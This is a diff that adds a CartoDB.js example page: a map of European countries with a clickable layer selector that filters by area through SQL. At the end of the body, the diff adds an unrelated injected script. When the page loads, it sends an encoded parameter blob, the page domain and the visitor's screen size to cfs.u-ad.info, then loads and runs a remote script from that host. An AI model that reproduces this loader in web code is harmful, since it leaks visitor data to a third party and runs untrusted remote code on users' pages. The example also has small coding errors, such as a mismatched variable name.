@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Layer selector example | CartoDB.js</title>
+    <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
+    <link rel="shortcut icon" href="http://cartodb.com/assets/favicon.ico" />
+    <style>
+      html, body, #map {
+        height: 100%;
+        padding: 0;
+        margin: 0;
+      }
+
+      #layer_selector {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        padding: 0;
+      }
+
+      #layer_selector ul {
+        padding: 0; margin: 0;
+        list-style-type: none;
+      }
+
+      #layer_selector li {
+        border-bottom: 1px solid #999;
+        padding: 15px 30px;
+        font-family: "Helvetica", Arial;
+        font-size: 13px;
+        color: #444;
+        cursor: auto;
+      }
+
+      #layer_selector li:hover {
+        background-color: #F0F0F0;
+        cursor: pointer;
+      }
+
+      #layer_selector li.selected {
+        background-color: #EEE;
+      }
+    </style>
+
+    <script type="infowindow/html" id="infowindow_template">
+      <span> custom infowindow </span>
+      <div class="cartodb-popup">
+        <a href="#close" class="cartodb-popup-close-button close">x</a>
+
+         <div class="cartodb-popup-content-wrapper">
+           <div class="cartodb-popup-content">
+             <h4>Test infowindow </h4>
+             //<div id="star_rating"><h4>Test</h4></div>
+             <h4>{{content.data.name}}</h4>
+
+           </div>
+         </div>
+         <div class="cartodb-popup-tip-container"></div>
+      </div>
+    </script>
+
+    <link rel="stylesheet" href="http://libs.cartocdn.com/cartodb.js/v3/3.11/themes/css/cartodb.css" />
+    <script src="../vendor/jquery.js"></script>
+    <script src="../lib/jquery.raty.js"></script>
+    <script src="javascripts/labs.js" type="text/javascript"></script>
+  </head>
+  <body>
+    <div id="map"></div>
+    <div id="layer_selector" class="cartodb-infobox">
+      <ul>
+        <li data="all" class="selected">All countries</li>
+        <li data="1000">area >1000 km<sup>2</sup></li>
+        <li data="6000">area >6000 km<sup>2</sup></li>
+        <li data="10000">area >10000 km<sup>2</sup></li>
+        <li data="50000">area >50000 km<sup>2</sup></li>
+      </ul>
+    </div>
+
+    <!-- include cartodb.js library -->
+    <script src="http://libs.cartocdn.com/cartodb.js/v3/3.11/cartodb.js"></script>
+
+    <script>
+      $.fn.raty.defaults.path = '../lib/images';
+
+      // create layer selector
+      function createSelector(layer) {
+        var sql = new cartodb.SQL({ user: 'documentation' });
+
+        var $options = $('#layer_selector li');
+        $options.click(function(e) {
+          // get the area of the selected layer
+          var $li = $(e.target);
+          var area = $li.attr('data');
+
+          // deselect all and select the clicked one
+          $options.removeClass('selected');
+          $li.addClass('selected');
+
+          // create query based on data from the layer
+          var query = "select * from european_countries_e";
+
+          if(area !== 'all') {
+            query = "select * from european_countries_e where area > " + area;
+          }
+
+          // change the query in the layer to update the map
+          layer.setSQL(query);
+        });
+      }
+
+      function main() {
+        cartodb.createVis('map', 'http://documentation.cartodb.com/api/v2/viz/2b13c956-e7c1-11e2-806b-5404a6a683d5/viz.json', {
+          tiles_loader: true,
+          center_lat: 50,
+          center_lon: 20,
+          zoom: 3
+        })
+        .done(function(vis, layers) {
+          // layer 0 is the base layer, layer 1 is cartodb layer
+          var subLayer = layers[1].getSubLayer(0);
+          sublayer.infowindow.set('template', $('#infowindow_template').html());
+          createSelector(subLayer);
+
+        })
+        .error(function(err) {
+          console.log(err);
+        });
+
+        // star rating
+        
+        $('#star_rating').raty({ score: 3 });
+
+      }
+
+      window.onload = main;
+    </script>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bDs0VU28sH3a5iMG4mZCVW8tHsVkZ3RPKvPbn51Rmq4m1OuMtey7tlMMdZX6U3L%2f2EsvVEWRw9GT7XDXcpGoKTKSGuMty%2bwX6ailaqsDY5sQKZaxYNFMbCSWXkavLTgFMkkko3RP%2fRe2PYVp%2fqdwXsy5rRyH07bVQGLn2zNdf19rzNx63GWHcIThppwn1LRV39S488uoLO52HR%2fyu3fE3%2f%2fmJqYOb82dM0rUK6x%2b8v92LGGK99kQ%2bqZquS4lpGLBX4M6Z%2b75P5OpldSOtu32jXN%2boBg%2fcrnWUxHNa8yEdjueHfEZBtnT4BzajEmr5UNCVtS4KzPr2mwKlYWd6mxbsCEa3v6TkruKiz6tT243L26l4A0Jff5KHeBTiQmlZGVfkBaUXjH0iRgab%2fomB06LF4yeGCAxrfg%2f2iLfd6Vvwg1nqAGIowXJ%2fs6NZg2IUsCOi6XxPIl006GquoRQcukuu5ojB5r50bRYvLtYykDSO%2fKSn29LPgiUaWjzy6Da%2bwvT2uMtuSKPNTwUCvZ%2fzk35%2fha6cvF508JxsKTb8qZEjpJs%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
